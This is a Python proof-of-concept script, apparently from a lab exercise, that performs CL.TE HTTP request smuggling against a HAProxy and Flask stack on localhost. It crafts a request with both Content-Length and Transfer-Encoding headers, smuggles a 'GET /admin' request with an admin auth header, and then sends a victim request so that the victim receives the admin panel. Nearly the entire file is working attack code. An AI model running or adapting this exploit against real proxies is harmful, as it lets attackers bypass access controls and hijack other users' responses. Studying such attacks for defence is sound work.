import socket
import time

TARGET_HOST = "localhost"
TARGET_PORT = 80


def build_smuggle_payload():
    """
    Build a CL.TE smuggling payload:

    - HAProxy honors Content-Length and treats everything after headers
      as one large POST body on a single connection.
    - Flask (via Werkzeug) honors Transfer-Encoding: chunked and stops
      reading the body at the terminating "0\\r\\n\\r\\n".
    - The bytes after "0\\r\\n\\r\\n" become a *queued second request*
      on the same TCP connection.
    """

    # The inner, *smuggled* request that we want the backend to see later.
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Admin-Auth: secret-token\r\n"
        "\r\n"
    )

    # Chunked body that the backend will see as the POST body.
    # One small chunk "X", then terminating 0-size chunk.
    chunked_body = "1\r\nX\r\n0\r\n\r\n"

    body = chunked_body + smuggled
    content_length = len(body)

    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {content_length}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{body}"
    )
    return request.encode("ascii"), smuggled.encode("ascii")


def send_raw(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(data)
    response = s.recv(65535)
    s.close()
    return response


def main():
    print("=== Scenario 1: CL.TE Request Smuggling ===")
    payload, smuggled = build_smuggle_payload()

    print("\n[1] Built smuggling payload.")
    print("    - Outer request: POST / HTTP/1.1")
    print("    - Headers include BOTH Content-Length and Transfer-Encoding: chunked")
    print("    - Body layout:")
    print("        [chunked body] 1\\r\\nX\\r\\n0\\r\\n\\r\\n")
    print("        [smuggled]     GET /admin HTTP/1.1 ...")
    print("    - HAProxy uses Content-Length (covers entire body including smuggled GET).")
    print("    - Backend honors Transfer-Encoding and stops at 0\\r\\n\\r\\n,")
    print("      leaving the smuggled GET queued for the next request.")

    print("\n[1] Sending smuggling POST (kept-alive connection).")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(payload)

    resp1 = s.recv(65535)
    print("\n--- Response to smuggling POST ---")
    print(resp1.decode("iso-8859-1", errors="replace"))

    print("\n[1] Waiting 500ms before sending victim request on a NEW connection.")
    time.sleep(0.5)

    victim_req = (
        "GET /api/user?id=victim HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")

    print("[2] Sending victim GET /api/user?id=victim.")
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect((TARGET_HOST, TARGET_PORT))
    s2.sendall(victim_req)
    resp2 = s2.recv(65535)
    s2.close()

    print("\n--- Response to victim GET /api/user?id=victim ---")
    print(resp2.decode("iso-8859-1", errors="replace"))

    print(
        "\nExplanation:\n"
        "1. HAProxy forwards the POST with both CL and TE to Varnish and the backend.\n"
        "2. HAProxy uses Content-Length to decide that the POST body includes both the\n"
        "   chunked data AND the smuggled GET /admin request.\n"
        "3. The backend, however, honors Transfer-Encoding: chunked and stops reading\n"
        "   the body at the terminating '0\\r\\n\\r\\n'. The bytes after that form a\n"
        "   queued request: 'GET /admin ...'.\n"
        "4. When the next client sends a GET /api/user?id=victim on a fresh connection\n"
        "   through HAProxy, the backend connection is re-used and the previously\n"
        "   smuggled 'GET /admin' is processed in place of (or before) the victim's\n"
        "   request. The victim receives the admin panel content.\n"
    )


if __name__ == "__main__":
    main()

